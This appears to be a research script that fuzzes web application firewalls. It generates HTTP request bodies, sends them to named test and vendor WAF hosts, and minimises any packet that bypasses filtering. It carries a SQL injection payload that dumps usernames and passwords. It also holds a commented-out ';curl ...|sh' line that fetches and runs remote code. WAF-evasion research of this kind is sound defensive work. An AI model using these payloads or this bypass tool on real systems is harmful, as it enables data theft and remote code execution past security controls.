from typing import Callable
from HTTPResponse import HTTPResponse
from utils import request
import os
import pickle
import time

def generator_based_attack_minized(host,port,path,save_path,judge_func:Callable[[HTTPResponse],bool]):
    from generator import Generator
    base = f'''POST /{path}?Submit=1 HTTP/1.1\r
User-Agent: Chrome/104.0.5112.102\r
Cookie: PHPSESSID=k27c1hljusb5lqs596j244l3i2; security=low\r
Accept: */*\r
Host: {host}\r
'''
#     base = f'''POST /{path} HTTP/1.1\r
# User-Agent: Chrome/104.0.5112.102\r
# Accept: */*\r
# Host: {host}:{port}\r
# '''

#     base = f'''POST /{path} HTTP/1.1\r
# User-Agent: Chrome/104.0.5112.102\r

# Accept: */*\r
# Host: {host}\r
# '''


    def gen_output(base:str,body:str)->str:
        body_begin = body.find("\r\n\r\n") + len("\r\n\r\n")
        content_length = len(body) - body_begin
        content_length_header = "Content-Length: %d" % content_length

        packet = base + content_length_header +"\r\n" + body
        return packet

    # body_tree = Generator("<start>")
    # body = body_tree.build_tree()

    # packet = gen_output(base,body)

    # print(packet)

    # removed_node = body_tree.random_remove_node()
    # body = body_tree.output()

    # packet = gen_output(base,body)

    # print(packet)

    i = 0
    while True:
        i +=1
        body_tree = Generator("<start>")
        body = body_tree.build_tree()

        packet = gen_output(base,body).encode()

        print("--%d--" % i)
        print(packet.decode())
        print("----")
        try:
            res:HTTPResponse = request(packet,host,port,timeout=1)
            #print(res.raw_packet.decode())
        except ConnectionRefusedError as e:
            time.sleep(1)
            continue
        print("status_code",res.status_code)

        if judge_func(res):
       #if "BYPASSED" in res.raw_packet.decode():
            print("bypass!","\n",packet)
            case_save_dir = os.path.join(save_path,md5(packet))
            os.makedirs(case_save_dir)
            with open(os.path.join(case_save_dir,"orginal."+md5(packet)),"wb") as f:
                f.write(packet)
            with open(os.path.join(case_save_dir,"orginal."+md5(packet))+".data","wb") as f:
                f.write(pickle.dumps(body_tree))
            #minizing
            recover_pool = []
            while True:
                removed_node = body_tree.random_remove_node()
                if removed_node == None:
                    print("payload Mimized")
                    packet = gen_output(base,body_tree.output()).encode()
                    with open(os.path.join(case_save_dir,"minimized."+md5(packet)),"wb") as f:
                        f.write(packet)
                    break
                body = body_tree.output()
                packet = gen_output(base,body).encode()
                print("--Minize:%d--" % i)
                print(packet.decode())
                print("----")
                res:HTTPResponse = request(packet,host,port)
                #if "smithy" in res.raw_packet.decode():
                if judge_func(res):
                    body_tree.remove_node_children(removed_node)
                    with open(os.path.join(case_save_dir,md5(packet)),"wb") as f:
                        f.write(packet)
                    # 恢复已经recover但是不在pool中的
                    body_tree.node_pool.extend(recover_pool)
                    recover_pool = []
                else:
                    #恢复被删除的节点
                    removed_node.recover()
                    recover_pool.append(removed_node)
                    #body_tree.recover_node(removed_node)
            break

    pass


if __name__ == "__main__":
    #test_all(RESULT_FOLDER,overwrite=True,result_file="result.csv")
   #fuzz_attack(test_url=WAF_TARGET_LIST["safeline"]["url"],taint=b"/etc/passwd")
   #test_baseline(RESULT_FOLDER,overwrite=True)
   #test("content_type_summgling",overwrite=True)
   #test("baseline_formdata",overwrite=True)
#    test("long_parameter",overwrite=True)
    # test(
    #     "long_parameter",overwrite=True
    # )
#    from python_mutators.helper_functions import md5
#    print(md5(b"1123124"))
    # if len(sys.argv) > 1:
    #     test(sys.argv[1],overwrite=True)
    # else:
    #     test("raw_body",overwrite=True)


    #test("php_default_content_type")
    # aliyun.fuzzme.buptmerak.cn:12601
    #generator_based_attack("aliyun.fuzzme.buptmerak.cn",12601,"vulnerabilities/sqli/")
    # try:
    #     solved = 0
    #     tot = 0
    #     while 1:
    #         tot += generator_based_attack("dvwa.hw.fuzzme.buptmerak.cn",80,"vulnerabilities/sqli/")
    #         #tot += generator_based_attack("aliyun.fuzzme.buptmerak.cn",12601,"vulnerabilities/sqli/")
    #         solved += 1
    # except KeyboardInterrupt:
    #     print(tot,solved)
    #     pass
    #while True:
        #generator_based_attack("dvwa.hw.fuzzme.buptmerak.cn",80,"vulnerabilities/sqli/")
        #generator_based_attack("aliyun.fuzzme.buptmerak.cn",12601,"vulnerabilities/sqli/")
        #generator_based_attack("47.104.6.229",80,"sqli.php")
    TAINT_KEY = "id"
    TAINT  = "1' union select 1,group_concat(user,0x3a,password) from users #"
    #TAINT  = ";curl yuy.xyz|sh"

    def judge_func(res:HTTPResponse)->bool:
        # if "BYPASSED" in res.raw_packet.decode():
        # if "smithy" in res.raw_packet.decode():
        #     return True
        try:
            print("TAINT_KEY exist",res.body_json["form"][TAINT_KEY])
            if TAINT == res.body_json["form"][TAINT_KEY]:
                return True
        except KeyError:
            return False
        return False

    def judge_func2(res:HTTPResponse)->bool:
        #if "BYPASSED" in res.raw_packet.decode():
        if "smithy" in res.raw_packet.decode():
            return True
        # try:
        #     print("TAINT_KEY exist",res.body_json["form"][TAINT_KEY])
        #     if TAINT == res.body_json["form"][TAINT_KEY]:
        #         return True
        # except KeyError:
        #     return False
        return False

    def judge_func3(res:HTTPResponse)->bool:
        #if "BYPASSED" in res.raw_packet.decode():
        try:
            print("TAINT_KEY exist",res.body_json[TAINT_KEY])
            if TAINT == res.body_json[TAINT_KEY]:
                return True
        except KeyError:
            return False
        return False

    #generator_based_attack("fuzzme.buptmerak.cn",28280,"vulnerabilities/sqli/")
    while True:
        #generator_based_attack_minized("47.104.6.229",80,"sqli.php",os.path.join("exp","safeline","minized"),judge_func)
        #generator_based_attack_minized("hw.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","huawei","minized_flask"),judge_func)
        generator_based_attack_minized("aliyun.fuzzme.buptmerak.cn",12601,"vulnerabilities/sqli/",os.path.join("exp","aliyun","new_php_minized"),judge_func2)
        #generator_based_attack_minized("dvwa.forti.fuzzme.buptmerak.cn",80,"vulnerabilities/sqli/",os.path.join("exp","fortinet","minized_php"),judge_func2)
        #generator_based_attack_minized("dvwa.barr.fuzzme.buptmerak.cn",80,"vulnerabilities/sqli/",os.path.join("exp","barr","minized_php"),judge_func2)
        #generator_based_attack_minized("bin.barr.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","barr","minized_flask"),judge_func)
        #generator_based_attack_minized("go.hw.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","huawei","minized_go"),judge_func)
        #generator_based_attack_minized("node.hw.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","huawei","minized_node"),judge_func)
        #generator_based_attack_minized("tomcat.hw.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","huawei","minized_tomcat"),judge_func)
        #generator_based_attack_minized("tomcat.hw.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","huawei","minized_tomcat"),judge_func)
        #generator_based_attack_minized("fuzzme.buptmerak.cn",28280,"vulnerabilities/sqli/",os.path.join("exp","fortinet","minized_php"),judge_func2)
        #generator_based_attack_minized("node.forti.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","forti","minized_express"),judge_func)
        #generator_based_attack_minized("node.forti.fuzzme.buptmerak.cn",80,"post",os.path.join("exp","web","minized_express"),judge_func)
        #generator_based_attack_minized("127.0.0.1",3000,"echo/post",os.path.join("exp","raw","minized_rails"),judge_func)
        #generator_based_attack_minized("127.0.0.1",8000,"post",os.path.join("exp","raw","minized_rockets"),judge_func)
        #generator_based_attack_minized("fuzzme.buptmerak.cn",28680,"post",os.path.join("exp","octopus","minized_flask"),judge_func)
        #generator_based_attack_minized("54.215.77.160",80,"post",os.path.join("exp","f5bigip","minized_flask"),judge_func)
        #generator_based_attack_minized("waftest.jianjunchen.com",80,"post",os.path.join("exp","cloudflare_waf","minized_flask"),judge_func)
        #generator_based_attack_minized("wafTestALB-1928269217.us-west-1.elb.amazonaws.com",80,"post",os.path.join("exp","amazon_waf_2","minized_flask"),judge_func)
        #generator_based_attack_minized("janusec.fuzzme.buptmerak.cn",28880,"post",os.path.join("exp","janusec_waf","minized_flask"),judge_func)
        #generator_based_attack_minized("34.160.186.200",80,"post",os.path.join("exp","google_waf_3","rce_minized_flask"),judge_func)
        #generator_based_attack_minized("ct.fuzzme.buptmerak.cn",28880,"post",os.path.join("exp","ct_waf","rce_minized_flask"),judge_func)
        #generator_based_attack_minized("testwaf-erezf9geg8ffcgcg.z01.azurefd.net",80,"post",os.path.join("exp","azure","new_minized"),judge_func)
        #generator_based_attack_minized("testwaf-erezf9geg8ffcgcg.z01.azurefd.net",80,"post",os.path.join("exp","azure","new_minized"),judge_func)
